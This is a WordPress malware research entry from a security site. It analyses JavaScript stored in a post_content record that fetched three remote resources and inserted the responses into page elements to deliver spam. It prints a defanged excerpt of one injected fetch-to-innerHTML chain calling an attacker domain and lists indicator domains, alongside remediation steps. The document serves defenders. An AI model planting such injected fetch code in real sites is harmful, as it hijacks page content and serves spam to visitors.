---
title: "Database-Stored JavaScript Fetch Spam Injection Research"
h1: "Database-Stored fetch() Calls Injecting Remote Spam Content"
slug: "database-fetch-spam-injection"
description: "Forensic analysis of Divi-formatted post content that fetched three remote resources and inserted responses into named HTML elements."
status: "published"
reportDate: "2026-01-19"
lastReviewed: "2026-07-22"
threatCategory: "Database-stored remote-content injection"
affectedComponents:
  - "WordPress posts table"
  - "Divi-formatted post content"
  - "Browser Fetch API"
observedLocations:
  - "A post_content database record"
  - "Elements with IDs datax, info1, and info2"
confirmedBehaviors:
  - "Fetches three remote JavaScript-path resources"
  - "Reads each response as text"
  - "Assigns returned text to element innerHTML"
confidence: "High"
severity: "High"
severityRationale: "The database screenshot and supplied snippet directly show remote fetches and innerHTML insertion. The returned content was not retained."
evidenceSource: "Anonymized investigation with one privacy-reviewed database screenshot and a supplied JavaScript excerpt"
schemaType: "TechArticle"
screenshots:
  - src: "/wordpress-threats/seo-spam-database-injection_evidence-1.png"
    alt: "Database post_content field showing fetch calls embedded in Divi content"
    caption: "The expanded post_content cell shows Divi markers and fetch calls to external domains followed by innerHTML assignment. Adjacent rows are not used to infer behavior."
    supports: "Remote fetch injection was stored in a WordPress post-content record"
    width: 1577
    height: 767
    privacyReviewed: true
indicators:
  - value: "sengatanlebah[.]shop/back.js"
    type: "distinctive artifact"
    confidence: "higher"
  - value: "jasabacklink[.]buzz/backlink/sigma.js"
    type: "distinctive artifact"
    confidence: "higher"
  - value: "Element IDs datax, info1, info2"
    type: "distinctive artifact"
    confidence: "higher"
  - value: "Divi markers adjacent to three fetch-to-innerHTML chains"
    type: "distinctive artifact"
    confidence: "higher"
  - value: "fetch()"
    type: "contextual indicator"
    confidence: "contextual"
  - value: "innerHTML"
    type: "contextual indicator"
    confidence: "contextual"
  - value: "post_content"
    type: "contextual indicator"
    confidence: "contextual"
  - value: "Divi shortcodes"
    type: "contextual indicator"
    confidence: "contextual"
limitations:
  - "The remote responses were not retained."
  - "The evidence does not identify how the database row was modified."
  - "No vulnerable plugin, theme, or version was confirmed."
  - "The number of affected pages was not established."
relatedResearch:
  - "m6bmm64-hidden-anchor-injection"
  - "ushort-company-post-content-redirect"
  - "wpinfo-pst1-database-redirect"
relatedGuides:
  - title: "Hidden backlink database fetch injection"
    href: "/blog/wordpress-hidden-spam-backlinks-database-fetch-injection/"
  - title: "WordPress database malware guide"
    href: "/blog/wordpress-database-malware-complete-guide/"
relatedCaseStudies:
  - title: "Hidden database malware case study"
    href: "/case-studies/failed-google-blacklist-request-how-to-find-hidden-database-malware/"
relatedService:
  title: "WordPress malware removal"
  href: "/wordpress-malware-removal/"
siteOwner:
  symptomGroups:
    - "spam-unwanted-content"
    - "suspicious-files-code"
  searchDescription: "Unexpected content appears inside WordPress pages from database scripts? See a stored fetch-based injection that inserted remote responses into page elements."
  summary: "This entry is relevant when unexpected blocks, links, or spam appear in rendered pages and the source is not found in theme files. The retained database script made remote requests and inserted returned text into selected page elements."
  observed:
    - "A retained database record contained JavaScript with three fetch requests and DOM insertion targets."
  possible:
    - "Visitors may see unexpected remote content inside otherwise legitimate page sections."
    - "The symptom may change or disappear when the remote endpoints stop responding."
  questions:
    - "Why is remote content appearing on WordPress pages from a database record?"
    - "Can injected JavaScript use fetch to place spam inside existing page elements?"
  evidenceNote: "The insertion mechanism is confirmed; the remote responses were not retained, so their exact content is unknown."
canonical: "https://www.mdpabel.com/malware-research/database-fetch-spam-injection/"
index: true
---

## Summary

This WordPress malware research entry documents database-stored remote-content injection evidence observed during one anonymized client investigation. The narrow topic is **Database-Stored fetch() Calls Injecting Remote Spam Content**: the page records the exact artifact, identifiers, and visible control flow instead of repeating a general malware-removal article.

This is consistent with database-stored remote spam delivery because the browser inserts server-provided text into page elements. The retained evidence does not show what the endpoints returned at investigation time.

## Investigation context

Anonymized investigation with one privacy-reviewed database screenshot and a supplied JavaScript excerpt. The report date is retained from the original investigation notes. Broader cleanup guidance remains in [the WordPress malware removal guide](/blog/wordpress-malware-removal-expert-guide-to-clean-hacked-wordpress-site/); this entry is limited to what the supplied code and screenshots support.

## Observed artifact

Remote fetch injection was stored in a WordPress post-content record.

![Database post_content field showing fetch calls embedded in Divi content](/wordpress-threats/seo-spam-database-injection_evidence-1.png "The expanded post_content cell shows Divi markers and fetch calls to external domains followed by innerHTML assignment. Adjacent rows are not used to infer behavior.")

## Confirmed findings

- The code was visible inside a post_content database field.
- The content includes Divi line-break markers.
- Three fetch calls request external resources and read response text.
- Responses are inserted into datax, info1, and info2 through innerHTML.

## Technical analysis

### How the injected fetch chain updates page elements

The following code keeps the identifiers and control flow needed for defensive verification while removing secrets, complete payloads, and operational request instructions.

**Redacted defensive excerpt**

```js
fetch("hxxps://sengatanlebah[.]shop/back.js")
  .then((response) => response.text())
  .then((text) => (document.getElementById("datax").innerHTML = text));
// two similar remote fetches shortened
```

This excerpt is intentionally incomplete. It should be used for code search, baseline comparison, and incident review—not copied into a live site.

## Analyst assessment

This is consistent with database-stored remote spam delivery because the browser inserts server-provided text into page elements. The retained evidence does not show what the endpoints returned at investigation time.

The severity reflects the capability visible in this artifact and its position in the investigated WordPress environment. It is not a claim about campaign prevalence, a particular vulnerability, or an outcome that the retained evidence does not show.

## Indicators of compromise

### Higher-confidence indicators

- `sengatanlebah[.]shop/back.js`
- `jasabacklink[.]buzz/backlink/sigma.js`
- `Element IDs datax, info1, info2`
- `Divi markers adjacent to three fetch-to-innerHTML chains`

### Contextual indicators

- `fetch()`
- `innerHTML`
- `post_content`
- `Divi shortcodes`

Contextual indicators are not proof of infection by themselves. Confirm them through trusted-file comparison, neighboring code, database provenance, request logs, or the distinctive combinations listed above.

## What this evidence does not establish

- The remote responses were not retained.
- The evidence does not identify how the database row was modified.
- No vulnerable plugin, theme, or version was confirmed.
- The number of affected pages was not established.

## Artifact-specific remediation

- Export the affected row before editing.
- Remove the injected script from the confirmed database record and review revisions or duplicates.
- Search the database for the domains and element IDs.
- Review administrator actions and write-capable integrations for the entry point.

For a complete response sequence, use the [broader malware-removal guide](/blog/wordpress-malware-removal-expert-guide-to-clean-hacked-wordpress-site/) or the [WordPress malware-removal service](/wordpress-malware-removal/) when hands-on incident response is appropriate.

## Recurrence verification

- Repeat the database search after page saves and scheduled tasks.
- Verify rendered HTML no longer contains the three fetch chains.
- Monitor the affected post for unauthorized revisions.

## Related malware research

[Browse the WordPress malware research hub](/malware-research/).

- [M6bMm64 Hidden Anchor and Off-Screen CSS in post_content](/malware-research/m6bmm64-hidden-anchor-injection/)
- [ushort.company Meta-Refresh and JavaScript Redirect in post_content](/malware-research/ushort-company-post-content-redirect/)
- [wpinfo-pst1 Obfuscated Redirect Stored in post_content](/malware-research/wpinfo-pst1-database-redirect/)

## Related guides and case studies

- [Hidden backlink database fetch injection](/blog/wordpress-hidden-spam-backlinks-database-fetch-injection/)
- [WordPress database malware guide](/blog/wordpress-database-malware-complete-guide/)
- [Hidden database malware case study](/case-studies/failed-google-blacklist-request-how-to-find-hidden-database-malware/)

## Methodology and privacy note

This analysis is based on retained code, screenshots, paths, and notes from an anonymized WordPress client investigation. Confirmed findings are limited to visible or supplied evidence; professional interpretation is labeled as analyst assessment. Screenshots were reviewed for client identifiers, account paths, usernames, email addresses, credentials, tokens, database details, and unrelated records. Sensitive or operational material remains outside the public page, and every public code block is a redacted defensive excerpt.
